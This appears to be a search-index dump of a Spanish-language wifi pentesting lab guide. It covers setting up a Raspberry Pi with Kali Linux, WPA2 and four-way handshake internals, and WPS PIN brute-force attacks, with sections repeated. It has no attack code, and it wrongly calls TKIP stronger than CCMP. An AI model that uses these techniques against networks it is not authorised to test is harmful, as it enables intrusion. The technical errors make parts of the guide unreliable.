VideoCore IV 3D. Dimensiones de placa de 8.5 por 5.3 cm. Como podemos ver nos ofrece una gran serie de posibilidades para un tama\u00f1o muy reducido, lo cual nos permitir\u00e1 llevarlo pasando desapercibidos en cualquier mochila o incluso en libros. Escogiendo nuestro sistema Las raspberry tienen arquitectura ARM de forma que existen una serie de sistemas operativos dise\u00f1ados especificamente para funcionar en estos dispositivos, entre los cuales podemos destacar Raspbian por ser el sistema operativo oficial de Raspberry y Kali Linux por ser la distribuci\u00f3n m\u00e1s conocida para pentesting y la que estaremos usando. Cuando hayamos escogido el sistema operativo para trabajar, el siguiente paso ser\u00e1 montarlo dentro de la tarjeta SD. En entornos Linux la herramienta recomendada para ello es dd y en entornos Windows y Mac podemos optar por Etcher . Instalaci\u00f3n de Kali Linux usando DD Cuando obtengamos la imagen de Kali Linux, tendremos que descomprimirla, generalmente viene comprimida con xz. Pasaremos a descompirmir la imagen usando: $ xz --decompress kali-linux-raspberrypi.img.xz Una vez descomprimida la imagen pasar\u00e9mos a montarla dentro de la tarjeta SD para usarla posteriormente en la raspberry, para ello usaremos la herramienta dd: $ dd if=kali-linux-raspberrypi.img of=/dev/sdbX status=progress Una vez haya finalizado dd podremos iniciar la raspberry y comenzar con la configuraci\u00f3n. Creando un punto de Acceso propio Con el fin de utilizar la raspberry de forma remota y sin conexi\u00f3n a internet (puesto que no tenemos esta garantizada), pasaremos a crear un punto de acceso haciendo uso de una antena Wifi (en el caso del modelo raspberry pi 3 puede ser la interna). Para facilitar el trabajo usaremos un script de configuraci\u00f3n que nos automatiza la instalaci\u00f3n de un servidor DHCP (dnsmasq) y Hostapd ambos necesarios para la correcta instalaci\u00f3n y funcionamiento del punto de acceso. Podemos encontrar el script en el repositorio de Github Con esto conseguimos tener acceso por SSH haciendo uso de nuestro m\u00f3vil o ordenador independientemente de la conexi\u00f3n a internet. Puesto que estaremos trabajando posteriormente con redes wifi es recomendable tener 2 antenas independientes para realizar los ataques descritos en el laboratorio.","title":"Preparando el arsenal"},{"location":"raspberry/#preparando-el-arsenal","text":"","title":"Preparando el arsenal"},{"location":"raspberry/#configurando-la-raspberry-pi-como-herramienta-de-hacking","text":"","title":"Configurando la Raspberry  PI como herramienta de hacking"},{"location":"raspberry/#que-es-una-raspberry","text":"El proyecto Raspberry Pi consiste en una serie de ordenadores cuyo principal objetivo era potencial el aprendizaje en entornos educativos as\u00ed como en paises en vias de desarrollo, sin embargo, gracias al potencial de estos equipos se utilizan para otros muchos fines como rob\u00f3tica o en nuestro caso pentesting.","title":"\u00bfQu\u00e9 es una Raspberry?"},{"location":"raspberry/#cuales-son-las-caracteristicas-que-tiene","text":"Procesador a 1,2 GHz de 64 bits con cuatro n\u00facleos ARMv8. 1GB de Memoria. 802.11n Wireless LAN. Bluetooth 4.1. Bluetooth Low Energy (BLE). 4 puertos USB. 40 pines GPIO. Puerto Full HDMI. Puerto Ethernet. Conector combo compuesto de audio y v\u00eddeo de 3,5 mm. Interfaz de la c\u00e1mara (CSI). Interfaz de pantalla (DSI). Ranura para tarjetas microSD (ahora push-pull en lugar de push-push). N\u00facleo de gr\u00e1ficos VideoCore IV 3D. Dimensiones de placa de 8.5 por 5.3 cm. Como podemos ver nos ofrece una gran serie de posibilidades para un tama\u00f1o muy reducido, lo cual nos permitir\u00e1 llevarlo pasando desapercibidos en cualquier mochila o incluso en libros.","title":"\u00bfCu\u00e1les son las caracter\u00edsticas que tiene?"},{"location":"raspberry/#escogiendo-nuestro-sistema","text":"Las raspberry tienen arquitectura ARM de forma que existen una serie de sistemas operativos dise\u00f1ados especificamente para funcionar en estos dispositivos, entre los cuales podemos destacar Raspbian por ser el sistema operativo oficial de Raspberry y Kali Linux por ser la distribuci\u00f3n m\u00e1s conocida para pentesting y la que estaremos usando. Cuando hayamos escogido el sistema operativo para trabajar, el siguiente paso ser\u00e1 montarlo dentro de la tarjeta SD. En entornos Linux la herramienta recomendada para ello es dd y en entornos Windows y Mac podemos optar por Etcher .","title":"Escogiendo nuestro sistema"},{"location":"raspberry/#instalacion-de-kali-linux-usando-dd","text":"Cuando obtengamos la imagen de Kali Linux, tendremos que descomprimirla, generalmente viene comprimida con xz. Pasaremos a descompirmir la imagen usando: $ xz --decompress kali-linux-raspberrypi.img.xz Una vez descomprimida la imagen pasar\u00e9mos a montarla dentro de la tarjeta SD para usarla posteriormente en la raspberry, para ello usaremos la herramienta dd: $ dd if=kali-linux-raspberrypi.img of=/dev/sdbX status=progress Una vez haya finalizado dd podremos iniciar la raspberry y comenzar con la configuraci\u00f3n.","title":"Instalaci\u00f3n de Kali Linux usando DD"},{"location":"raspberry/#creando-un-punto-de-acceso-propio","text":"Con el fin de utilizar la raspberry de forma remota y sin conexi\u00f3n a internet (puesto que no tenemos esta garantizada), pasaremos a crear un punto de acceso haciendo uso de una antena Wifi (en el caso del modelo raspberry pi 3 puede ser la interna). Para facilitar el trabajo usaremos un script de configuraci\u00f3n que nos automatiza la instalaci\u00f3n de un servidor DHCP (dnsmasq) y Hostapd ambos necesarios para la correcta instalaci\u00f3n y funcionamiento del punto de acceso. Podemos encontrar el script en el repositorio de Github Con esto conseguimos tener acceso por SSH haciendo uso de nuestro m\u00f3vil o ordenador independientemente de la conexi\u00f3n a internet. Puesto que estaremos trabajando posteriormente con redes wifi es recomendable tener 2 antenas independientes para realizar los ataques descritos en el laboratorio.","title":"Creando un punto de Acceso propio"},{"location":"vulnerabilities/","text":"An\u00e1lisis de redes wifi En esta etapa tendremos que interacturar con los diferentes componentes de la red que desamos atacar (tantos elementos software como hardware) de forma que encontromos alg\u00fan protocolo inseguro que podamos explotar con posterioridad. Dentro de la tecnolog\u00eda wifi encontramos diferentes elementos en los cuales podemos basarnos para detectar vulnerabilidades. Tenemos que tener en cuenta el tipo de cifrado que esta utilizando la red, de forma que si usa WEP ser\u00eda muy f\u00e1cil de romper mientras que con WPA la complejidad aumenta. Terminolog\u00eda Durante las siguientes fases estaremos haciendo referencia a algunas palabras clave relacionadas con las redes wifi, a modo de recopilaci\u00f3n dejar\u00e9 aqu\u00ed las pricipales: SSID / ESSID : Nombre de la red wifi BSSID : Direcci\u00f3n f\u00edsica (MAC) del router / AP Channel: Canal en el que se encunetra la red wifi que esta emitiendo PWR: Power Range, intensidad con la que nos llega la se\u00f1al. Lo ideal ser\u00eda tener una por inferior a -50 para relizar auditorias. ENC y CIPHER: Hace refenrencia al cifrado de la red as\u00ed como la encriptaci\u00f3n Canales dentro de las redes wifi Las redes wifi utilizan ondas de radio que nos permiten comunicarnos a trav\u00e9s de una red. Las se\u00f1ales wifi pueden usar un determinado n\u00famero de canales (13), que les permiten existir diferentes redes sin que exista ruido (interferencias entre ellas) de forma que un canal en el cual no esten confguradas muchas redes wifi tendr\u00e1 menos interferencias. Cuando estamos escaneando en busca de redes wifi, ser\u00e1 necesario conocer el canal en la que esta emitiendo nuestro objetivo de forma que podamos capturar con posteioridad informaci\u00f3n relevante. Tipos de cifrado en redes wifi Los principales cifrados que nos encontramos en las redes wireless son: WEP (Wired Equivalent Privacy) WPA (Wi-Fi Protected Access) WPA-2 (Wi-Fi Protected Access II) Estos procotolos, aunque encargados de cifrar la contrase\u00f1a evitando que cualquier persona las lea con facilidad, no impiden que puedan ser capturados. Por lo cual, si obtenemos un paquete con la contrase\u00f1a (aunque este cifrada) si dicha contrase\u00f1a no es muy compleja ser\u00e1 de menos trabajo computacional encontrarla. La complejidad de la contrase\u00f1a wifi es importante, sin embargo, no tenemos que olvidar la importancia de aplicar el protocolo adecuado de cifrado. El cifrado WEP es el m\u00e1s antiguo, por lo tanto es m\u00e1svulnerable al existir m\u00e1s ataques.Estos protocolos han ido evolucionando con el tiempo, de forma que se pudieran solventar las diferentes vulnerabilidades que se iban descubriendo, sin embargo, las vulnerabilidades en estos protocoles siguen apareciendo, una de las m\u00e1s recientes es Krack . Recientemente se esta comenzando con la implantaci\u00f3n de un nuevo protocolo de cifrado WPA3, sin embargo, desde que este protocolo se comienz ha implementar hasta que se convierta en el est\u00e1ndar pasar\u00e1 un considerable periodo de tiempo ( as\u00ed como paso con la implementaci\u00f3n de WPA ) Funcionamiento del protocolo WPA2 En este escenario se va a simular uno de los casos m\u00e1s comunes, una red con cifrado WPA PSK (Pre Shared Key). Antes de continuar con la obtenci\u00f3n de la contrase\u00f1a, pasaremos a explicar como funciona el cifrado WPA2 y que es el 4-Way-Handsake. El cifrado WPA se implement\u00f3 aumentando la seguridad existente en su predecesor WPA, para ello se cambio el tipo de cifrado que se utilizaba, siendo AES (Advanced Encription Standard) el que implenta WPA2. WPA2 queda implementado con el est\u00e1ndar IEEE 802.11 i . Este est\u00e1ndar prove\u00eda RsN (Robust Security Network), para lo cual fue necesario la implementaci\u00f3n de 2 protocolos: Four-Way Handsake Group Key Hansake El est\u00e1ndar prove\u00eda de dos protocolos de integridad y confidencialidad de datos: CCMP y TKIP, siendo este \u00faltimo el m\u00e1s robusto puesto que CCMP se implement\u00f3 para obtener compatibilidad con los routers que soportaban cifrado WEP. WPA2 realiza una autenticacic\u00f3n inicial mediante PSK (Pre Shared Key) o siguiendo un cambio EAP mediante el est\u00e1ndar 802.1x (implementaci\u00f3n em Linux bajo wpa_supplicant), sin embargo este \u00faltimo m\u00e9todo requiere un servidor EAPOL de autenticaci\u00f3n, por lo cual en entornos dom\u00e9sticos es menos usual encontrarlo. Esta contrase\u00f1a compartida permite asegurar que el dispositivo que quiere conectarse esta autenticado en el punto de acceso. Posterior a este intercambio de claves, se procede a la generaci\u00f3n de una clave privada denominada PMK(Pairwise Master Key), la cual es el resultado de pasar la contrase\u00f1a a la funci\u00f3n criptogr\u00e1fica PBKDF2-SHA1. Cuando nos encontramos en una Pre-Shared-Key Network la PMK y PSK coinciden. Four-Way Handsake El protocolo Four-Way Handsake fue ideado con la intenci\u00f3n de que el AP (Access Point) y el cliente puedan probar que conocen las claves PSK/PMK sin necesidad de revelar dicha clave. Para poder realizar esto el AP y el cliente encriptan los mensajes y se los env\u00edan al otro (dichos mensajes se pueden desencriptar con la PMK), si se logra desencriptarlos correctamente se demuestra que tienen conocimiento de la PSK. Four-Way Handsake usa una PTK(Pairwise Transient Key), la cual esta compuesta por una combinanci\u00f3n de : PMK AP nonce (ANonce) y STA nonce (SNonce) AP Mac STA Mac El producto de estos valores introducido en una funcui\u00f3n pseudoaleatoria tiene como resultado la PTK. El Handsake contiene tambi\u00e9n la GTK (Group Temporal Key), la cual es usada para desencriptar el tr\u00e1fico de multicast y broadcast. El AP env\u00eda un paquete Anonce (el cual contiene un valor que solo puede ser usado una vez en una funci\u00f3n criptogr\u00e1fica) y un Key Replay Counter encargado de llevar la cuenta de los parquetes que se han transmitido. El cliente (STA) responde con SNonce junto con un MIC (Message Integrity code), el cual incluye aunteticaci\u00f3n, por lo tanto es un MAIC (Message Authentication Integrity Code) y el Key Replay Counter El AP comprueba si el mensaje 2 es correcto mediante los campos MIC, Key Replay Counter, MIC, Anonce y RSN. Si el mensaje es correcto pasar\u00e1 a generar la GTK con otro MIC. El STA verifica los datos del mensaje 3 y si es v\u00e1lido env\u00eda confirmaci\u00f3n al AP. Este protocolo es vulnerable a KRACK, la cual fue parcheda adecuadamente. Sin embargo, se observaba que en 2018 exist\u00edan dispositivos sin actualizar que podian ser vulnerables. Wifi Protected Setup (WPS) Es un protocolo fue implementado en 2006 con la finalidad de que aquellos usuarios que carezcan de conociemintos sobre seguridad en redes wifi, tengan la opci\u00f3n de crear una conexi\u00f3n segura y agregar nuevos dispositivos a una red existente. Para poder realizar estas acciones se implementaron 4 modos: M\u00e9todo Pin: Este m\u00e9todo consiste en introducir en el dispositivo un pin leido de una pegatina o pantalla en el dispositivo. Presionando el bot\u00f3n: Este m\u00e9todo consiste en presionar en ambos dispositivos (AP y STA) el bot\u00f3n de conexi\u00f3n, de forma que se active el modo de descubrimiento enlazando ambos dispositivos. NFC USB El m\u00e9todo 3 y 4 se obvia la explicaci\u00f3n puesto que han quedado completamente desactualizados. \u00bfComo funciona el protocolo? El protocolo consiste en un intercambio de mensajes EAP (Extensible Authentication Protocol), los cuales estan causados por una accion del usuario (confiando en una informaci\u00f3n previa). Esta informaci\u00f3n (WPS PIN) es intercambiada meidante un nuevo elemento de informaci\u00f3n (IE) que es agregado al beacon, probe response y opcionalmente al probe request y mensajes de petici\u00f3n/respuesta de asociaci\u00f3n. Tras esta comunicaci\u00f3n entre los dispositivos el dispositivo comienza un protocolo de sesi\u00f3n. Esta sesi\u00f3n consiste en 8 mensajes que son seguidos (en caso de completarse satisfactoriamente) por un mensaje que indica que el procolo se ha completado correctamente. Vulnerabilidades Online brute-force Attack: Este ataque consiste en realizar fuerza bruta al PIN del dispositivo, de forma que al obtenerlo se puede obtener la clave WPA. Offline brute-force Attack: Esta ataque afecta a las implementaciones por defecto de algunos fabricantes. Consiste en obtener E-S1 y E-S2 nonces de forma que un fallo en la generaci\u00f3n aleatoria de los mismos permite obtener el pin en un par de minutos. Este ataque es conocido como pixiwps Physical Security Issues: Cualquier fallo de seguridad puede ser extra\u00eddo del router este no se encuentra en un lugar seguro.","title":"Analizando las redes Wifi"},{"location":"vulnerabilities/#analisis-de-redes-wifi","text":"En esta etapa tendremos que interacturar con los diferentes componentes de la red que desamos atacar (tantos elementos software como hardware) de forma que encontromos alg\u00fan protocolo inseguro que podamos explotar con posterioridad. Dentro de la tecnolog\u00eda wifi encontramos diferentes elementos en los cuales podemos basarnos para detectar vulnerabilidades. Tenemos que tener en cuenta el tipo de cifrado que esta utilizando la red, de forma que si usa WEP ser\u00eda muy f\u00e1cil de romper mientras que con WPA la complejidad aumenta.","title":"An\u00e1lisis de redes wifi"},{"location":"vulnerabilities/#terminologia","text":"Durante las siguientes fases estaremos haciendo referencia a algunas palabras clave relacionadas con las redes wifi, a modo de recopilaci\u00f3n dejar\u00e9 aqu\u00ed las pricipales: SSID / ESSID : Nombre de la red wifi BSSID : Direcci\u00f3n f\u00edsica (MAC) del router / AP Channel: Canal en el que se encunetra la red wifi que esta emitiendo PWR: Power Range, intensidad con la que nos llega la se\u00f1al. Lo ideal ser\u00eda tener una por inferior a -50 para relizar auditorias. ENC y CIPHER: Hace refenrencia al cifrado de la red as\u00ed como la encriptaci\u00f3n","title":"Terminolog\u00eda"},{"location":"vulnerabilities/#canales-dentro-de-las-redes-wifi","text":"Las redes wifi utilizan ondas de radio que nos permiten comunicarnos a trav\u00e9s de una red. Las se\u00f1ales wifi pueden usar un determinado n\u00famero de canales (13), que les permiten existir diferentes redes sin que exista ruido (interferencias entre ellas) de forma que un canal en el cual no esten confguradas muchas redes wifi tendr\u00e1 menos interferencias. Cuando estamos escaneando en busca de redes wifi, ser\u00e1 necesario conocer el canal en la que esta emitiendo nuestro objetivo de forma que podamos capturar con posteioridad informaci\u00f3n relevante.","title":"Canales dentro de las redes wifi"},{"location":"vulnerabilities/#tipos-de-cifrado-en-redes-wifi","text":"Los principales cifrados que nos encontramos en las redes wireless son: WEP (Wired Equivalent Privacy) WPA (Wi-Fi Protected Access) WPA-2 (Wi-Fi Protected Access II) Estos procotolos, aunque encargados de cifrar la contrase\u00f1a evitando que cualquier persona las lea con facilidad, no impiden que puedan ser capturados. Por lo cual, si obtenemos un paquete con la contrase\u00f1a (aunque este cifrada) si dicha contrase\u00f1a no es muy compleja ser\u00e1 de menos trabajo computacional encontrarla. La complejidad de la contrase\u00f1a wifi es importante, sin embargo, no tenemos que olvidar la importancia de aplicar el protocolo adecuado de cifrado. El cifrado WEP es el m\u00e1s antiguo, por lo tanto es m\u00e1svulnerable al existir m\u00e1s ataques.Estos protocolos han ido evolucionando con el tiempo, de forma que se pudieran solventar las diferentes vulnerabilidades que se iban descubriendo, sin embargo, las vulnerabilidades en estos protocoles siguen apareciendo, una de las m\u00e1s recientes es Krack . Recientemente se esta comenzando con la implantaci\u00f3n de un nuevo protocolo de cifrado WPA3, sin embargo, desde que este protocolo se comienz ha implementar hasta que se convierta en el est\u00e1ndar pasar\u00e1 un considerable periodo de tiempo ( as\u00ed como paso con la implementaci\u00f3n de WPA )","title":"Tipos de cifrado en redes wifi"},{"location":"vulnerabilities/#funcionamiento-del-protocolo-wpa2","text":"En este escenario se va a simular uno de los casos m\u00e1s comunes, una red con cifrado WPA PSK (Pre Shared Key). Antes de continuar con la obtenci\u00f3n de la contrase\u00f1a, pasaremos a explicar como funciona el cifrado WPA2 y que es el 4-Way-Handsake. El cifrado WPA se implement\u00f3 aumentando la seguridad existente en su predecesor WPA, para ello se cambio el tipo de cifrado que se utilizaba, siendo AES (Advanced Encription Standard) el que implenta WPA2. WPA2 queda implementado con el est\u00e1ndar IEEE 802.11 i . Este est\u00e1ndar prove\u00eda RsN (Robust Security Network), para lo cual fue necesario la implementaci\u00f3n de 2 protocolos: Four-Way Handsake Group Key Hansake El est\u00e1ndar prove\u00eda de dos protocolos de integridad y confidencialidad de datos: CCMP y TKIP, siendo este \u00faltimo el m\u00e1s robusto puesto que CCMP se implement\u00f3 para obtener compatibilidad con los routers que soportaban cifrado WEP. WPA2 realiza una autenticacic\u00f3n inicial mediante PSK (Pre Shared Key) o siguiendo un cambio EAP mediante el est\u00e1ndar 802.1x (implementaci\u00f3n em Linux bajo wpa_supplicant), sin embargo este \u00faltimo m\u00e9todo requiere un servidor EAPOL de autenticaci\u00f3n, por lo cual en entornos dom\u00e9sticos es menos usual encontrarlo. Esta contrase\u00f1a compartida permite asegurar que el dispositivo que quiere conectarse esta autenticado en el punto de acceso. Posterior a este intercambio de claves, se procede a la generaci\u00f3n de una clave privada denominada PMK(Pairwise Master Key), la cual es el resultado de pasar la contrase\u00f1a a la funci\u00f3n criptogr\u00e1fica PBKDF2-SHA1. Cuando nos encontramos en una Pre-Shared-Key Network la PMK y PSK coinciden.","title":"Funcionamiento del protocolo WPA2"},{"location":"vulnerabilities/#four-way-handsake","text":"El protocolo Four-Way Handsake fue ideado con la intenci\u00f3n de que el AP (Access Point) y el cliente puedan probar que conocen las claves PSK/PMK sin necesidad de revelar dicha clave. Para poder realizar esto el AP y el cliente encriptan los mensajes y se los env\u00edan al otro (dichos mensajes se pueden desencriptar con la PMK), si se logra desencriptarlos correctamente se demuestra que tienen conocimiento de la PSK. Four-Way Handsake usa una PTK(Pairwise Transient Key), la cual esta compuesta por una combinanci\u00f3n de : PMK AP nonce (ANonce) y STA nonce (SNonce) AP Mac STA Mac El producto de estos valores introducido en una funcui\u00f3n pseudoaleatoria tiene como resultado la PTK. El Handsake contiene tambi\u00e9n la GTK (Group Temporal Key), la cual es usada para desencriptar el tr\u00e1fico de multicast y broadcast. El AP env\u00eda un paquete Anonce (el cual contiene un valor que solo puede ser usado una vez en una funci\u00f3n criptogr\u00e1fica) y un Key Replay Counter encargado de llevar la cuenta de los parquetes que se han transmitido. El cliente (STA) responde con SNonce junto con un MIC (Message Integrity code), el cual incluye aunteticaci\u00f3n, por lo tanto es un MAIC (Message Authentication Integrity Code) y el Key Replay Counter El AP comprueba si el mensaje 2 es correcto mediante los campos MIC, Key Replay Counter, MIC, Anonce y RSN. Si el mensaje es correcto pasar\u00e1 a generar la GTK con otro MIC. El STA verifica los datos del mensaje 3 y si es v\u00e1lido env\u00eda confirmaci\u00f3n al AP. Este protocolo es vulnerable a KRACK, la cual fue parcheda adecuadamente. Sin embargo, se observaba que en 2018 exist\u00edan dispositivos sin actualizar que podian ser vulnerables.","title":"Four-Way Handsake"},{"location":"vulnerabilities/#wifi-protected-setup-wps","text":"Es un protocolo fue implementado en 2006 con la finalidad de que aquellos usuarios que carezcan de conociemintos sobre seguridad en redes wifi, tengan la opci\u00f3n de crear una conexi\u00f3n segura y agregar nuevos dispositivos a una red existente. Para poder realizar estas acciones se implementaron 4 modos: M\u00e9todo Pin: Este m\u00e9todo consiste en introducir en el dispositivo un pin leido de una pegatina o pantalla en el dispositivo. Presionando el bot\u00f3n: Este m\u00e9todo consiste en presionar en ambos dispositivos (AP y STA) el bot\u00f3n de conexi\u00f3n, de forma que se active el modo de descubrimiento enlazando ambos dispositivos. NFC USB El m\u00e9todo 3 y 4 se obvia la explicaci\u00f3n puesto que han quedado completamente desactualizados.","title":"Wifi Protected Setup (WPS)"},{"location":"vulnerabilities/#como-funciona-el-protocolo","text":"El protocolo consiste en un intercambio de mensajes EAP (Extensible Authentication Protocol), los cuales estan causados por una accion del usuario (confiando en una informaci\u00f3n previa). Esta informaci\u00f3n (WPS PIN) es intercambiada meidante un nuevo elemento de informaci\u00f3n (IE) que es agregado al beacon, probe response y opcionalmente al probe request y mensajes de petici\u00f3n/respuesta de asociaci\u00f3n. Tras esta comunicaci\u00f3n entre los dispositivos el dispositivo comienza un protocolo de sesi\u00f3n. Esta sesi\u00f3n consiste en 8 mensajes que son seguidos (en caso de completarse satisfactoriamente) por un mensaje que indica que el procolo se ha completado correctamente.","title":"\u00bfComo funciona el protocolo?"},{"location":"vulnerabilities/#vulnerabilidades","text":"Online brute-force Attack: Este ataque consiste en realizar fuerza bruta al PIN del dispositivo, de forma que al obtenerlo se puede obtener la clave WPA. Offline brute-force Attack: Esta ataque afecta a las implementaciones por defecto de algunos fabricantes. Consiste en obtener E-S1 y E-S2 nonces de forma que un fallo en la generaci\u00f3n aleatoria de los mismos permite obtener el pin en un par de minutos. Este ataque es conocido como pixiwps Physical Security Issues: Cualquier fallo de seguridad puede ser extra\u00eddo del router este no se encuentra en un lugar seguro.","title":"Vulnerabilidades"}]}